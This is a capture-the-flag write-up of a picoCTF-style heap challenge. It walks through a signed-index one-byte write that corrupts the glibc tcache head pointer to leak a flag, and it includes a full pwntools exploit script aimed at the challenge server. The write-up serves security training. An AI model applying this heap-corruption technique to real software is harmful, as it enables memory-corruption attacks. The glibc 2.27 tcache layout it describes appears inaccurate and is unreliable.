# CyLab — Cache Me Outside

* **Platform:** CyLab Security Academy / picoCTF (Challenge ID: `146`)
* **Category:** Binary Exploitation / Heap Tcache Corruption (Pwn)
* **Difficulty:** Difficulty 3
* **Date Solved:** October 2026
* **Tools Used:** Python 3, pwntools, GDB, glibc 2.27 runtime loader
* **Binary:** `heapedit` (x86_64 ELF) with bundled `libc.so.6` (glibc 2.27)

---

## TL;DR

The program reads `flag.txt` into seven heap chunks of size `malloc(0x80)` (`chunk0` through `chunk6`), followed by an eighth decoy chunk (`chunk7`). After freeing `chunk6` and `chunk7` into the glibc 2.27 tcache bin, the application offers an arbitrary 1-byte write relative to `chunk0`: `x[index] = value` (where `index` is a signed integer). By calculating the negative byte offset from `chunk0` to the tcache management structure (`tcache_perthread_struct->entries[7]`), we overwrite the least significant byte of the tcache head pointer from `0x90` to `0x08`. This points the tcache head to `chunk6 + 8`. The subsequent `malloc(0x80)` returns this misaligned chunk, causing `puts(chunk + 0x10)` to print the flag string at `chunk6 + 0x18`.

---

## Recon

### Binary Information

Running `file` and `checksec`:

```text
$ file heapedit
heapedit: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.27.so, BuildID[sha1]=..., not stripped

$ checksec --file=heapedit
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./'
```

Key observations:
1. **glibc 2.27 Tcache:** In glibc 2.27, tcache pointers are raw cleartext addresses without Safe-Linking obfuscation.
2. **Deterministic Heap Layout:** Because heap segments are page-aligned and allocations are executed in static sequence, the lower 12 bits of all heap addresses are constant regardless of ASLR.
3. **Signed Index Write:** The expression `x[index] = value` uses a signed integer for `index`, permitting writes prior to `chunk0`.

---

## Static Analysis & Vulnerability

### 1. Decompiled Logic

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    char flag[64];
    FILE *f = fopen("flag.txt", "r");
    fgets(flag, 64, f);

    char *chunks[8];
    for (int i = 0; i < 7; i++) {
        chunks[i] = malloc(0x80);
        strcpy(chunks[i], "Congrats! Your flag is: ");
        strcat(chunks[i], flag);        // Flag text begins at chunks[i] + 0x18
    }

    chunks[7] = malloc(0x80);
    strcpy(chunks[7], "Sorry! This won't help you: <random>");

    char *x = chunks[0];                // Base pointer x points to chunk 0

    free(chunks[6]);
    free(chunks[7]);                    // tcache head now points to chunk 7

    int index;
    char value;
    printf("Address: ");
    scanf("%d", &index);                // VULNERABILITY: Signed index allows arbitrary negative offset
    printf("Value: ");
    scanf(" %c", &value);

    x[index] = value;                   // 1-byte arbitrary relative memory write

    char *final = malloc(0x80);
    puts(final + 0x10);                 // Expects final + 0x10 to be flag string
    return 0;
}
```

### 2. Heap Layout & Tcache Metadata

In glibc 2.27, the thread's tcache metadata struct resides at the beginning of the heap (`heap_base + 0x10`):
- `counts`: Array of 2-byte entry counts (`heap_base + 0x10` to `0x88`)
- `entries`: Array of 64-bit pointers to the heads of each tcache bin (`heap_base + 0x88`)
- Bin `7` corresponds to requested size `0x80` (chunk size `0x90`), located at `heap_base + 0x88`.

Allocation addresses:
- `heap_base + 0x88`: `tcache->entries[7]` (points to `chunk7`)
- `heap_base + 0x14a0`: `chunk0` (pointer `x`)
- `heap_base + 0x1800`: `chunk6` (payload begins at `+0x1800`, flag at `+0x1818`)
- `heap_base + 0x1890`: `chunk7` (default tcache head, ends in byte `\x90`)

```text
       Heap Base + 0x0088: tcache->entries[7] = [ ...1890 ]  <-- Target of 1-byte write
                           Overwritten to:      [ ...1808 ]
                           
       Heap Base + 0x14a0: chunk0 (Pointer x)
                           ...
       Heap Base + 0x1800: chunk6 payload: "Congrats! Your flag is: " + flag
                           |                  |
                           |                  +--> Offset +0x18: "academy{...}"
                           +--> Offset +0x08: (Target of modified tcache head)
                           
       Heap Base + 0x1890: chunk7 payload: "Sorry!..."
```

---

## Dynamic Analysis & Exploitation Strategy

### 1. Distance Calculation
$$\text{index} = \text{address}(\text{entries}[7]) - \text{address}(\text{chunk0})$$
$$\text{index} = 0\text{x}88 - 0\text{x}14\text{a}0 = -0\text{x}1418 = -5144$$

### 2. Overwrite Value
The default pointer in `entries[7]` is `heap_base + 0x1890`.
We overwrite the least significant byte from `0x90` to `0x08` (ASCII `\x08` / Backspace).
The modified pointer becomes:
$$\text{New Head} = \text{heap\_base} + 0\text{x}1808 = \text{chunk6} + 8$$

### 3. Allocation and Print
- `malloc(0x80)` dequeues `entries[7]`, returning `final = chunk6 + 8`.
- The program prints string at `final + 0x10`:
  $$(\text{chunk6} + 8) + 0\text{x}10 = \text{chunk6} + 0\text{x}18$$
  This corresponds exactly to the start of the flag string!

---

## Exploit

The complete exploit script is available at [exploit.py](exploit.py):

```python
#!/usr/bin/env python3
import sys, re
from pwn import *

context.log_level = "info"
HOST, PORT = "chatelaine.cylabacademy.net", 18200

# Delta from chunk0 (0x14a0) to tcache entries[7] (0x88)
INDEX = -5144       # -0x1418
# Low byte replacement: points head to chunk6 + 8
VALUE = b"\x08"

def solve(io):
    io.recvuntil(b"Address: ")
    io.sendline(str(INDEX).encode())

    io.recvuntil(b"Value: ")
    io.sendline(VALUE)

    data = io.recvall(timeout=3)
    m = re.search(rb"academy\{[^}]+\}", data)
    if m:
        log.success(f"Flag captured: {m.group().decode()}")
    else:
        print(data.decode(errors="replace"))

if __name__ == "__main__":
    io = process("./heapedit") if len(sys.argv) > 1 and sys.argv[1] == "local" else remote(HOST, PORT)
    solve(io)
```

---

## Flag

```text
$ python3 exploit.py
[+] Opening connection to chatelaine.cylabacademy.net on port 18200: Done
[+] Flag captured: academy{redacted}
[*] Closed connection to chatelaine.cylabacademy.net port 18200
```

---

## Key Takeaways & Lessons

1. **Targeting Tcache Metadata Structures:** In glibc heaps, the `tcache_perthread_struct` is stored at the bottom of the heap. Corrupting its bin pointers directly dictates the addresses returned by subsequent `malloc()` calls.
2. **Partial Address Corruption (1-Byte Overwrite):** Because heap chunks within the same page share identical high-order bits, modifying only the least significant byte allows shifting pointers to neighboring chunks without needing an ASLR leak.
3. **Misaligned Chunk Allocation:** Malloc does not inherently verify that a returned tcache pointer begins on a 16-byte chunk boundary; pointing into `chunk + 8` shifts application string offsets, directly aligning output routines to hidden data.
